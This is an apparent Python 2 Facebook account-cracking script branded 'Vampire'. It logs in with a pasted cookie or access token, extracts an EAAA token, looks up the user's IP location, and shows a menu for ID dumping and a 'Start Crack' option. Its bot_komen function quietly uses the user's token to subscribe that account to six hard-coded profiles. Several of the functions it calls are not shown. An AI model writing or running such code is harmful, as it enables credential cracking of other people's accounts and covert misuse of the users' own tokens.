#!/usr/bin/python2
# coding=utf-8
import requests, bs4, sys, os, subprocess, requests, sys, random, time, re, base64, json, getpass
reload(sys)
sys.setdefaultencoding('utf-8')
from multiprocessing.pool import ThreadPool
if 'linux' in sys.platform.lower():
    N = '\x1b[0m'
    G = '\x1b[1;92m'
    O = '\x1b[1;97m'
    R = '\x1b[1;91m'
else:
    N = ''
    G = ''
    O = ''
    R = ''

def banner():
    print ("\n" + warni + "    __     __                    _          \n    \ \   / /_ _ _ __ ___  _ __ (_)_ __ ___ \n     \ \ / / _  |  _   _ \|  _ \| |  __/ _ \\ \n      \ V / (_| | | | | | | |_) | | | |  __/\\\n       \_/ \__ _|_| |_| |_| .__/|_|_|  \___|\n                          |_| ")


host = 'https://mbasic.facebook.com'
ua = open('User-Agent.txt', 'r').read()
P = '\x1b[1;97m'
S = '\x1b[90m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
S2 = '\x1b[90m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
S5 = '\x1b[90m'
O = '\x1b[1;96m'
DK = '\x1b[90m'
my_color = [
 P, M, H, K, B, U, O, DK, S, S2, S5]
warna = random.choice(my_color)
warni = random.choice(my_color)
m = '\x1b[1;91m'
S = '\x1b[90m'
u = '\x1b[1;95m'
h = '\x1b[1;92m'
S2 = '\x1b[90m'
p = '\x1b[1;37m'
k = '\x1b[1;33m'
b = '\x1b[1;34m'
bm = '\x1b[96m'
dk = '\x1b[90m'
ips = None
try:
    b = requests.get('https://api.ipify.org').text.strip()
    ips = requests.get('https://ipapi.com/ip_api.php?ip=' + b, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].lower()
except:
    ips = None

uas = None
if os.path.exists('.browser'):
    if os.path.getsize('.browser') != 0:
        uas = open('.browser').read().strip()
touch_fbh = {'Host': 'touch.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
m_fbh = {'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
mbasic_h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
graph_h = {'Host': 'graph.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')


def jalan(z, t):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(t)


def load(word):
    lix = ['/', '-', '\xe2\x95\xb2', '|']
    for i in range(5):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
            time.sleep(0.2)
            sys.stdout.flush()


def chat():
    load('Please wait a moment---')
    os.system('xdg-open https://bit.ly/3whqL7o')


kunci = ('\n\t{}───▄█▌─{}▄{}─{}▄{}─▐█▄\n\t───██▌▀▀▄▀▀▐██\n\t───██▌─▄▄▄─▐██\n\t───▀██▌▐█▌▐██▀\n\t▄██████─▀─██████▄').format(p,m,k,m,p)



def lang(cookies):
    f = False
    rr = bs4.BeautifulSoup(requests.get('https://mbasic.facebook.com/language.php', headers=hdcok(), cookies=cookies).text, 'html.parser')
    for i in rr.find_all('a', href=True):
        if 'id_ID' in i.get('href'):
            requests.get('https://mbasic.facebook.com/' + i.get('href'), cookies=cookies, headers=hdcok())
            b = requests.get('https://mbasic.facebook.com/profile.php', headers=hdcok(), cookies=cookies).text
            if 'apa yang anda pikirkan sekarang' in b.lower():
                f = True

    if f == True:
        return True
    exit(' [!]Cookies Wrong.').format(R, N)


def basecookie():
    if os.path.exists('.cok'):
        if os.path.getsize('.cok') != 0:
            return gets_dict_cookies(open('.cok').read().strip())
        logs()
    else:
        logs()


def hdcok():
    global host
    global ua
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r


def gets_cookies(cookies):
    result = []
    for i in enumerate(cookies.keys()):
        if i[0] == len(cookies.keys()) - 1:
            result.append(i[1] + '=' + cookies[i[1]])
        else:
            result.append(i[1] + '=' + cookies[i[1]] + '; ')

    return ('').join(result)


def gets_dict_cookies(cookies):
    result = {}
    try:
        for i in cookies.split(';'):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
    except:
        for i in cookies.split('; '):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result


def gen():
    ck = raw_input(' ' + warna + '[' + warni + '+' + warna + ']' + warni + ' Cookie' + warna + ' :' + warni + ' ')
    if ck == '':
        gen()
    try:
        cks = gets_dict_cookies(ck)
        if lang(cks) == True:
            open('.cok', 'w').write(ck)
            convert()
            print ('' + warni + ' [' + warna + '!' + warni + ']' + warna + ' Login Success')
            time.sleep(1)
            menu()
        else:
            print ('' + warna + ' [' + warni + '!' + warna + ']' + warni + ' Invalid Cookie')
            gen()
    except Exception as e:
        print ' [!] Error : %s' % e
        gen()
        logs()


def log_token():
    data = raw_input(' ' + warni + '[' + warna + '+' + warni + ']' + warna + ' Token' + warni + ' :' + warna + '')
    try:
        me = requests.get('https://graph.facebook.com/me?access_token=' + data)
        a = json.loads(me.text)
        name = a['name']
        open('login.txt', 'w').write(data)
        print ('' + warni + ' [' + warna + '!' + warni + ']' + warna + ' Login Success')
        bot_komen()
        menu()
    except KeyError:
        print ('' + warna + ' [' + warni + '!' + warna + ']' + warni + ' Invalid Cookie')
        time.sleep(1.0)
        logs()


def convert():
    try:
        tomken = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': open('.cok', 'r').read()})
        find_token = re.search('(EAAA\\w+)', tomken.text)
        if find_token is None:
            pass
        else:
            open('login.txt', 'w').write(find_token.group(1))
            return
    except Exception as e:
        print R + '\n [!] Error : %s' % e
        exit()

    return


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ' [!] Token invalid'
        logs()

    requests.post('https://graph.facebook.com/100001027764318/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100002327464667/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/1399665666/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)
    menu()


def menu():
    try:
        toket = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        name = a['name']
        id = a['id']
        bh = requests.get('https://api.ipify.org').text.strip()
    except Exception as e:
        print (' [!] Error : %s' % e).format(R, N)
        time.sleep(1)
        logs()

    os.system('clear')
    banner()
    print "\033[1;93m⊰\x1b[96m᯽\x1b[1;93m⊱\x1b[1;97m┈──────────────╌\x1b[1;91m❊\x1b[92m Vampire \x1b[1;91m❊\x1b[1;97m╌──────────────┈\x1b[1;93m⊰\x1b[96m᯽\x1b[1;93m⊱\x1b[1;97m"
    print '\x1b[0;96m\t' + warni + '[' + warna + '\xe2\x88\x9a' + warni + ']' + warna + ' Welcome ' + warni + ':' + warna + ' '+ name
    print '\x1b[0;96m\t' + warni + '[' + warna + '\xe2\x88\x9a' + warni + ']' + warna + ' Id      ' + warni + ':' + warna + ' '+ id  
    print '\x1b[0;96m\t' + warni + '[' + warna + '\xe2\x88\x9a' + warni + ']' + warna + ' Your IP ' + warni + ':' + warna + ' ' + bh
    print '\x1b[0;96m\t' + warni + '[' + warna + '\xe2\x88\x9a' + warni + ']' + warna + ' DOP     ' + warni + ':' + warna + ' ' + a['birthday']
    print "\033[1;93m⊰\x1b[96m᯽\x1b[1;93m⊱\x1b[1;97m┈──────────────╌\x1b[1;91m❊\x1b[92m Vampire \x1b[1;91m❊\x1b[1;97m╌──────────────┈\x1b[1;93m⊰\x1b[96m᯽\x1b[1;93m⊱\x1b[1;97m"
    print '\n\t\t   '+ warni +'[ '+ warna + 'Select' + warni +' ]'
    print '\x1b[0;96m'
    print '\x1b[0;97m{' + warni + '01\x1b[1;97m}' + warna + ' Dump Slow Mode'
    print '\x1b[0;97m{' + warni + '02\x1b[1;97m}' + warna + ' Dump Fast Mode'
    print '\x1b[0;97m{' + warni + '03\x1b[1;97m}' + warna + ' Start Crack'
    print '\x1b[0;97m{' + warni + '04\x1b[1;97m}' + warna + ' Detele Fast.json'
    print '\x1b[1;97m{' + warni + '05\x1b[1;97m}' + warna + ' Change User-Agent'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m}' + warna + ' Exit'
    print "\033[1;93m⊰\x1b[96m᯽\x1b[1;93m⊱\x1b[1;97m┈──────────────╌\x1b[1;91m❊\x1b[92m Vampire \x1b[1;91m❊\x1b[1;97m╌──────────────┈\x1b[1;93m⊰\x1b[96m᯽\x1b[1;93m⊱\x1b[1;97m"
    r = raw_input('\x1b[0;97m ' + warni + ' [' + warna + '\xc2\xbb' + warni + ']' + warna + ' :' + warni + ' ')
    if r == '':
        print ('\x1b[0;97m [!] Fill in the Correct').format(R, N)
        menu()
    elif r == '1':
        publik()
    elif r == '2':
        idfrom_teman()
    elif r == '3':
        crack()
        exit()
    elif r == '4':
        os.system('rm -rf fast.json')
        jalan('[!] Deleting Files ...', 0.1)
        time.sleep(0.1)
        jalan('\n[\xe2\x88\x9a] File Has Been Deleted ...', 0.1)
        menu()
    elif r == '5':
        ubahagent()
        menu()
    elif r == '0': 
        try:
            os.remove('login.txt')
            exit(basecookie())
        except Exception as e:
            print '\x1b[0;97m   [!] Error File Not Found %s' % e

if __name__ == '__main__':
    logs()
